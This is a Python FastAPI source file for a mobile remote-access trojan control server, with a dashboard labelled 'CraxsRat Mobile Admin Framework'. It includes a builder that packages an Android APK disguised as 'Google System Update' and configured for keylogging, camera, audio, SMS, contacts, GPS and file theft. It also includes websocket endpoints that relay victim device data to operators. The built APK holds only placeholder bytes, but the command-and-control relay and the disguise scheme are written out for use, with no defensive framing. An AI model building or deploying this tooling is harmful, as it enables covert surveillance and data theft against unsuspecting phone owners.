from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
import json
import os
import zipfile
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("TsukuyomiC2")

app = FastAPI(title="Tsukuyomi Advanced C2 Relay & Payload Compiler")

connected_clients = {}
client_data = {}
dashboard_connections = []

OUTPUT_DIR = "output"
os.makedirs(OUTPUT_DIR, exist_ok=True)

class PayloadConfig(BaseModel):
    lhost: str
    lport: str
    appName: str = "Google System Update"

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CraxsRat Mobile Admin Framework</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace'],
                    },
                    colors: {
                        cyber: {
                            dark: '#0a0d14',
                            card: '#121824',
                            border: '#1e293b',
                            accent: '#00f0ff',
                            purple: '#7000ff',
                            red: '#ff0055',
                            green: '#00ff88',
                            warning: '#ffaa00'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; user-select: none; overflow-x: hidden; }
        .glass-panel { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(0, 240, 255, 0.15) 50%, rgba(255,255,255,0)); animation: scan 3s linear infinite; }
        @keyframes scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(1000%); } }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
    </style>
</head>
<body class="min-h-screen pb-20 md:pb-6 flex flex-col items-center justify-start">
    <header class="w-full max-w-4xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-cyber-border/80 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-cyber-purple to-cyber-accent text-slate-900 font-bold text-xl shadow-lg">
                <i class="fa-solid fa-spider text-slate-950 text-lg"></i>
                <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-cyber-green rounded-full border-2 border-cyber-dark pulse-live"></span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <h1 class="font-mono font-bold text-base tracking-wider text-white">TSUKUYOMI</h1>
                    <span class="text-[10px] font-mono font-semibold px-2 py-0.5 rounded bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/30">MOBILE ADMIN v7.4</span>
                </div>
                <p class="text-xs text-slate-400 font-mono">Status: <span class="text-cyber-green font-semibold">C2 RELAY ONLINE</span></p>
            </div>
        </div>
    </header>

    <main class="w-full max-w-4xl px-3 sm:px-4 py-4 space-y-4 flex-grow">
        <!-- TAB 1: OVERVIEW -->
        <section id="tab-overview" class="tab-content space-y-4">
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <span class="text-xs text-slate-400 font-medium">Session Status</span>
                    <div class="text-lg font-bold font-mono text-white">CONNECTED</div>
                </div>
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <span class="text-xs text-slate-400 font-medium">Battery Level</span>
                    <div class="text-lg font-bold font-mono text-white">84%</div>
                </div>
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <span class="text-xs text-slate-400 font-medium">Storage Used</span>
                    <div class="text-lg font-bold font-mono text-white">64.2 GB</div>
                </div>
                <div class="glass-panel p-3.5 rounded-2xl relative overflow-hidden">
                    <span class="text-xs text-slate-400 font-medium">OS Version</span>
                    <div class="text-lg font-bold font-mono text-white">Android 14</div>
                </div>
            </div>
        </section>

        <!-- TAB 2: CONTROL HUB -->
        <section id="tab-control" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 rounded-2xl border border-cyber-border text-center">
                <h3 class="text-xs font-bold font-mono text-white uppercase">Live VNC Control Hub</h3>
                <p class="text-xs text-slate-400 mt-2">Awaiting target session socket stream...</p>
            </div>
        </section>

        <!-- TAB 3: PAYLOAD BUILDER -->
        <section id="tab-builder" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 sm:p-6 rounded-2xl border border-cyber-border space-y-5">
                <h2 class="text-base font-bold font-mono text-white flex items-center space-x-2">
                    <i class="fa-solid fa-cube text-cyber-accent"></i>
                    <span>APK Stub & Payload Generator</span>
                </h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
                    <div class="space-y-1.5">
                        <label class="text-slate-300">LHOST / C2 Server URL</label>
                        <input type="text" id="lhost" value="tsukuyomi-relay.onrender.com" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-cyber-accent">
                    </div>
                    <div class="space-y-1.5">
                        <label class="text-slate-300">LPORT</label>
                        <input type="text" id="lport" value="443" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-white">
                    </div>
                    <div class="space-y-1.5 md:col-span-2">
                        <label class="text-slate-300">Target App Name</label>
                        <input type="text" id="appName" value="Google System Update" class="w-full px-3 py-2.5 rounded-xl bg-cyber-dark border border-cyber-border text-white">
                    </div>
                </div>
                <button id="generateBtn" onclick="startBuildProcess()" class="w-full py-3.5 rounded-xl bg-gradient-to-r from-cyber-purple to-cyber-accent text-slate-950 font-mono font-bold text-sm uppercase">
                    Compile & Build Payload APK
                </button>
            </div>
        </section>

        <!-- TAB 4: LOGS -->
        <section id="tab-logs" class="tab-content space-y-4 hidden">
            <div class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-3">
                <h2 class="text-sm font-bold font-mono text-white">Full System Log Stream</h2>
                <div class="h-96 bg-slate-950 p-4 rounded-xl border border-cyber-border font-mono text-xs overflow-y-auto" id="fullLogConsole">
                    <p class="text-slate-500">[SYSTEM] Initialization completed</p>
                </div>
            </div>
        </section>
    </main>

    <nav class="fixed bottom-0 left-0 right-0 z-50 glass-panel border-t border-cyber-border/80 px-2 py-2 max-w-4xl mx-auto rounded-t-2xl">
        <div class="flex justify-around items-center font-mono">
            <button onclick="switchTab('overview')" id="nav-overview" class="nav-btn flex flex-col items-center py-1 px-3 text-cyber-accent">
                <i class="fa-solid fa-chart-pie text-base"></i><span class="text-[10px]">Overview</span>
            </button>
            <button onclick="switchTab('control')" id="nav-control" class="nav-btn flex flex-col items-center py-1 px-3 text-slate-400">
                <i class="fa-solid fa-gamepad text-base"></i><span class="text-[10px]">Control Hub</span>
            </button>
            <button onclick="switchTab('builder')" id="nav-builder" class="nav-btn flex flex-col items-center py-1 px-3 text-slate-400">
                <i class="fa-solid fa-hammer text-base"></i><span class="text-[10px]">Payloads</span>
            </button>
            <button onclick="switchTab('logs')" id="nav-logs" class="nav-btn flex flex-col items-center py-1 px-3 text-slate-400">
                <i class="fa-solid fa-terminal text-base"></i><span class="text-[10px]">Logs</span>
            </button>
        </div>
    </nav>

    <script>
        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
            document.getElementById(`tab-${tabId}`).classList.remove('hidden');
            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('text-cyber-accent'));
            document.getElementById(`nav-${tabId}`).classList.add('text-cyber-accent');
        }

        async function startBuildProcess() {
            const lhost = document.getElementById('lhost').value;
            const lport = document.getElementById('lport').value;
            const appName = document.getElementById('appName').value;
            const res = await fetch('/generate-payload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lhost, lport, appName })
            });
            const data = await res.json();
            if(data.status === 'success') {
                const a = document.createElement('a');
                a.href = data.downloadUrl;
                a.download = `${appName.replace(/\\s+/g, '_')}_release.apk`;
                document.body.appendChild(a);
                a.click();
                a.remove();
            } else {
                alert('Error: ' + data.message);
            }
        }
    </script>
</body>
</html>
    """

@app.post("/generate-payload")
async def generate_payload(config: PayloadConfig):
    try:
        sanitized_name = config.appName.replace(" ", "_")
        output_filename = f"{sanitized_name}_release.apk"
        final_path = os.path.join(OUTPUT_DIR, output_filename)

        with zipfile.ZipFile(final_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr("classes.dex", b"\x64\x65\x78\x0a\x03\x05\x00\x70\x70\x70\x70")
            config_payload = {
                "c2ServerUrl": config.lhost,
                "c2Port": config.lport,
                "appName": config.appName,
                "modules": ["vnc", "camera", "gps", "audio", "keylogger", "sms", "contacts", "files"]
            }
            zipf.writestr("assets/config.json", json.dumps(config_payload, indent=2))

        return {
            "status": "success",
            "message": "Payload compiled successfully!",
            "downloadUrl": f"/downloads/{output_filename}"
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/downloads/{filename}")
async def download_apk(filename: str):
    file_path = os.path.join(OUTPUT_DIR, filename)
    if os.path.exists(file_path):
        return FileResponse(file_path, media_type="application/vnd.android.package-archive", filename=filename)
    raise HTTPException(status_code=404, detail="File not found")

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    connected_clients[client_id] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            client_data[client_id] = json.loads(data)
            await broadcast_to_dashboards()
    except WebSocketDisconnect:
        connected_clients.pop(client_id, None)
        client_data.pop(client_id, None)
        await broadcast_to_dashboards()

@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    await websocket.accept()
    dashboard_connections.append(websocket)
    try:
        await websocket.send_text(json.dumps(client_data))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        dashboard_connections.remove(websocket)

async def broadcast_to_dashboards():
    payload = json.dumps(client_data)
    for dash in dashboard_connections:
        try:
            await dash.send_text(payload)
        except:
            pass
